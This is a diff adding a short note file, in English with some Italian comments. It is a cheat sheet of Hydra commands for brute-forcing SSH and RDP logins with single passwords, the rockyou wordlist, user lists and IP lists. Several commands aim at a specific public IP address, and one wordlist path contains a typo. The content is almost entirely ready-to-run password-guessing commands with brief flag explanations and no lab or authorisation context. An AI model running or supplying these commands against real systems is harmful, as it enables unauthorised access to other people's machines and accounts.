@@ -1,0 +1,31 @@
+hydra -l root -p admin 13.81.100.177 -t 4 ssh
+
+-l flag takes a single user parameter.
+The -p flag takes a single password.
+The IP is obviously the IP of the target machine.
+The -t specifies the number of threads used. Hydra suggests 4 for SSH.
+The last part just tells Hydra that it will be attacking SSH.
+
+############################################################################
+
+You can specify a wordlist instead of a single password by using -P instead of -p.
+A good wordlist already exists at /usr/share/wordlists/rockyou.txt.gz.
+Just decompress it, and it's ready for Hydra to use.
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
+
+############################################################################
+
+Hydra also accepts wordlists for users and targets.
+They can be specified with the -L flag for users, and the -M flag for IPs.
+
+hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt -M Documents/ip.txt -t 4 ssh
+
+############################################################################
+# Attacco con liste utenti e password su indirizzo ip con porta Remote Desktop
+
+hydra -L users.txt -P password.txt 13.81.100.177 -t 4 rdp
+
+hydra -V -L users.txt -P password.txt 13.81.100.177 -t 4 rdp
+
+-V mostra tutto l'output
